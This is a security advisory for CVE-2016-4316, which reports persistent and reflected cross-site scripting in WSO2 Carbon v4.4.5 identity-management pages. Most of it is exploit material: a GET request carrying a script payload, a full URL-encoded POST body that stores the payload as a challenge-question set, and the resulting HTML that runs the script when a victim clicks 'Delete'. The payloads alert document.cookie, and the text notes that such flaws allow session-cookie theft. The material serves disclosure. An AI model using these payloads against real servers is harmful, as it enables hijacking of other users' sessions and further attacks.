[+] ISR: ApparitionSec


Vendor:
=============
www.wso2.com


Product:
==================
Ws02Carbon v4.4.5

WSO2 Carbon is the core platform on which WSO2 middleware products are built. It is based on Java OSGi technology, which allows
components to be dynamically installed, started, stopped, updated, and uninstalled, and it eliminates component version conflicts.
In Carbon, this capability translates into a solid core of common middleware enterprise components, including clustering, security,
logging, and monitoring, plus the ability to add components for specific features needed to solve a specific enterprise scenario.


Vulnerability Type:
===========================
Persistent / Reflected
Cross Site Scripting (XSS) - Cookie Disclosure


CVE Reference:
==============
CVE-2016-4316


Vulnerability Details:
=====================

WSo2 Carbon has multiple XSS vectors allowing attackers to inject client-side scripts into web pages viewed by other users.
A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy,
stealing session cookies and used as a platform for further attacks on the system.


Exploit code(s)
===============


Persistent XSS:

GET Request
https://victim-server:9443/carbon/identity-mgt/challenges-mgt.jsp?addRowId=XSS&setName="/><script>alert(document.cookie)</script>


Request two is POST
/carbon/identity-mgt/challenges-mgt-finish.jsp

setName=%22%2F%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&question0=&question1=City+where+you+were+born+%3F&setId1=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion1&question1=City+where+you+were+born+%3F&question2=Father%27s+middle+name+%3F&setId2=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion1&question2=Father%27s+middle+name+%3F&question3=Name+of+your+first+pet+%3F&setId3=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion2&question3=Name+of+your+first+pet+%3F&question4=Favorite+sport+%3F&setId4=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion2&question4=Favorite+sport+%3F&question5=Favorite+food+%3F&setId5=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion1&question5=Favorite+food+%3F&question6=Favorite+vacation+location+%3F&setId6=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion1&question6=Favorite+vacation+location+%3F&question7=Model+of+your+first+car+%3F&setId7=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion2&question7=Model+of+your+first+car+%3F&question8=Name+of+the+hospital+where+you+were+born+%3F&setId8=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion2&question8=Name+of+the+hospital+where+you+were+born+%3F&setId9=%22%2F%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&question9=XSS


Then XSS payload will be listed here in below URL:

https://victim-server:9443/carbon/identity-mgt/challenges-set-mgt.jsp?region=region1&item=identity_security_questions_menu

Finally when victim clicks to "Delete" entry on the page the XSS is executed.

Here is stored payload from the HTML source

<a onclick="removeSet('\x22/><script>alert(666)</script>')" style='background-image:url(images/delete.gif);'  type="button" class="icon-link">Delete</a></td>
